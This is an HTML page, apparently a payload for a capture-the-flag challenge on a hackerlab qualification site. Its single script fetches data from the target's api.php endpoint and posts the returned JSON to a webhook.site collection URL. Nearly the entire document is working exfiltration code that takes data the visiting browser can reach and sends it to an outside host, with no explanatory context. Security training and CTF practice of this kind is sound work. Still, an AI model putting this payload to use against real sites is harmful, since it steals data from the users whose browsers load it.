<!DOCTYPE html>
<html>
  <body>
<script>
    fetch('https://xnotes.qualif.hackerlab.bj/api.php')
    .then(response => {
      if (!response.ok) {
        throw new Error('Erreur de requête API : ' + response.statusText);
      }
      return response.json(); // Assumer que l'API retourne un JSON
    })
    .then(data => {
      console.log('Données reçues de l\'API :', data);

      // Envoyer les données reçues au webhook
      return fetch('https://webhook.site/0496b1c1-9913-4b2f-a3ac-50ee0bf25492', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data) // Convertir les données en chaîne JSON
      });
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Erreur lors de l\'envoi au webhook : ' + response.statusText);
      }
      return response.text();
    })
    .then(responseText => {
      console.log('Réponse du webhook :', responseText);
    })
    .catch(error => {
      console.error('Erreur :', error);
    });
    </script>
  </body>
</html>
